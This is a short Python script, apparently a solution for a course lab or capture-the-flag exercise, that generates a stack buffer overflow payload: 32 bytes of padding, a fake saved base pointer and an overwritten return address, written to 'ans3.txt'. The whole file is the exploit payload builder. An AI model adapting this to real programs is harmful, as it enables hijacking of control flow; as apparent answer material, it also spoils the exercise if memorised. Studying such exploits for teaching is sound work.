import struct

padding_len = 32          
fake_rbp = 0x403800       # 一个可写的内存地址
target_addr = 0x40122b 

payload = b'A' * padding_len
payload += struct.pack('<Q', fake_rbp)    
payload += struct.pack('<Q', target_addr) 

with open("ans3.txt", "wb") as f:
    f.write(payload)

print("Payload 'ans3.txt' generated successfully!")